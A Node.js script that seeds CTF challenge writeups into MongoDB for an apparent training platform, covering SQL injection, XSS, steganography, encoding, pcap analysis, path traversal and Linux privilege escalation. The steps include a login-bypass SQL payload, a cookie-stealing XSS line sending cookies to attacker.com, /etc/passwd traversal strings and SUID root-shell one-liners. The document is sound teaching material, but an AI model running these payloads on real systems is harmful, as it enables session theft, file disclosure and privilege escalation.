const mongoose = require('mongoose');
const dotenv = require('dotenv');
const Challenge = require('./models/Challenge');

dotenv.config();

const writeups = [
  {
    title: 'SQL Injection Basics',
    writeup: {
      content: 'This challenge demonstrates a classic SQL injection vulnerability in a login form. The backend query concatenates user input directly into the SQL statement without sanitization.',
      steps: [
        "Navigate to the login form and observe the username and password fields",
        "Try entering a single quote (') in the username field to test for SQL injection",
        "Notice the error — this confirms the input is not sanitized",
        "Enter the payload: ' OR '1'='1 in the username field with any password",
        "This closes the SQL string and adds a condition that is always true",
        "The query becomes: SELECT * FROM users WHERE username='' OR '1'='1' -- AND password='...'",
        "The database returns all users and you are logged in as the first user",
        "The flag is revealed in the dashboard after successful bypass"
      ],
      tools: ['Burp Suite', 'Browser DevTools', 'sqlmap (for automation)'],
      author: 'CyberLab Team'
    }
  },
  {
    title: 'XSS Reflected Attack',
    writeup: {
      content: 'Reflected XSS occurs when malicious script is injected through a URL parameter and reflected back in the response without proper sanitization.',
      steps: [
        "Find the search functionality on the target page",
        "Test basic XSS: enter <script>alert(1)</script> in the search box",
        "If an alert pops up, the page is vulnerable to reflected XSS",
        "To steal cookies, craft a payload: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
        "URL encode the payload and inject it via the search parameter",
        "The victim's browser executes the script and sends the cookie to the attacker",
        "Use the stolen session cookie to hijack the victim's session"
      ],
      tools: ['Browser DevTools', 'Burp Suite', 'XSS Hunter'],
      author: 'CyberLab Team'
    }
  },
  {
    title: 'Hidden in Plain Sight',
    writeup: {
      content: 'Steganography is the practice of hiding secret data within ordinary, non-secret files. In this challenge, a flag is hidden inside a PNG image.',
      steps: [
        "Download the provided PNG image",
        "First, run the 'strings' command to look for readable text: strings image.png",
        "Try steghide to extract hidden data: steghide extract -sf image.png",
        "If steghide asks for a password, try common passwords or empty password",
        "Alternatively, use zsteg for PNG files: zsteg image.png",
        "Check the image metadata with exiftool: exiftool image.png",
        "The flag will be revealed in the extracted file or metadata"
      ],
      tools: ['steghide', 'zsteg', 'strings', 'exiftool', 'stegsolve'],
      author: 'CyberLab Team'
    }
  },
  {
    title: 'Base64 Secrets',
    writeup: {
      content: 'This challenge involves multiple layers of encoding. The key is to recognize each encoding format and decode them in sequence.',
      steps: [
        "You are given an encoded string — look at it carefully",
        "The string ends with = or == which is a strong indicator of Base64 encoding",
        "Decode it using: echo 'encoded_string' | base64 -d",
        "Or use CyberChef online tool for easy decoding",
        "The result might still be encoded — check if it looks like Base64 again",
        "Keep decoding until you see FLAG{ in the output",
        "The challenge may use Base64 → Hex → Binary → ASCII layers"
      ],
      tools: ['CyberChef', 'base64 command', 'Python (import base64)'],
      author: 'CyberLab Team'
    }
  },
  {
    title: 'Packet Capture Analysis',
    writeup: {
      content: 'Network packet analysis involves examining captured network traffic to find sensitive information transmitted in plaintext.',
      steps: [
        "Open the provided .pcap file in Wireshark",
        "Look at the protocol hierarchy: Statistics → Protocol Hierarchy",
        "Filter for HTTP traffic by typing 'http' in the filter bar",
        "Look for POST requests which often contain login credentials",
        "Right-click a packet → Follow → HTTP Stream to see the full conversation",
        "Search for keywords like 'password', 'username', 'login' in the stream",
        "The credentials will be visible in plaintext in the HTTP POST body",
        "Use the found credentials to get the flag"
      ],
      tools: ['Wireshark', 'tcpdump', 'NetworkMiner'],
      author: 'CyberLab Team'
    }
  },
  {
    title: 'Directory Traversal',
    writeup: {
      content: 'Directory traversal (path traversal) allows attackers to access files outside the web root by manipulating file path variables.',
      steps: [
        "Find a file download or include parameter in the URL e.g. ?file=document.pdf",
        "Try basic traversal: ?file=../../../etc/passwd",
        "If blocked, try URL encoding: ?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "Try double encoding: ?file=%252e%252e%252f",
        "On Windows targets try: ?file=..\\..\\..\\windows\\win.ini",
        "Successfully reading /etc/passwd confirms the vulnerability",
        "Now read the flag file location hinted in the challenge description"
      ],
      tools: ['Burp Suite', 'curl', 'Browser DevTools'],
      author: 'CyberLab Team'
    }
  },
  {
    title: 'Linux File Permissions',
    writeup: {
      content: 'Understanding Linux file permissions is crucial for privilege escalation. Files with unusual permissions can reveal sensitive information.',
      steps: [
        "List all files with permissions: ls -la",
        "Look for world-readable files: find / -perm -o+r 2>/dev/null",
        "Look for SUID binaries: find / -perm -u+s 2>/dev/null",
        "Check hidden files and directories: ls -la | grep '^\\.'",
        "Look for files owned by root but readable by others",
        "Check /etc/passwd and /etc/shadow permissions",
        "The flag file may have unusual permissions making it accessible to regular users"
      ],
      tools: ['find command', 'ls', 'stat', 'getfacl'],
      author: 'CyberLab Team'
    }
  },
  {
    title: 'Linux Privilege Escalation',
    writeup: {
      content: 'Privilege escalation involves gaining higher system privileges than intended. SUID binaries are a common vector for this.',
      steps: [
        "First enumerate the system: uname -a, id, whoami",
        "Find SUID binaries: find / -perm -u=s -type f 2>/dev/null",
        "Check GTFOBins (gtfobins.github.io) for exploitation techniques",
        "Common vulnerable SUID binaries: find, vim, python, bash, cp",
        "Example with find: find . -exec /bin/sh -p \\; -quit",
        "Example with python: python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
        "Once root shell obtained, read /root/flag.txt for the flag"
      ],
      tools: ['linpeas.sh', 'GTFOBins', 'find command', 'LinEnum'],
      author: 'CyberLab Team'
    }
  }
];

const seed = async () => {
  try {
    await mongoose.connect(process.env.MONGO_URI);
    console.log('Connected to MongoDB');

    for (const item of writeups) {
      const challenge = await Challenge.findOne({ title: item.title });
      if (challenge) {
        challenge.writeup = item.writeup;
        await challenge.save();
        console.log(`Updated writeup for: ${item.title}`);
      } else {
        console.log(`Challenge not found: ${item.title}`);
      }
    }

    console.log('All writeups seeded!');
    mongoose.connection.close();
  } catch (err) {
    console.error('Error:', err);
    process.exit(1);
  }
};

seed();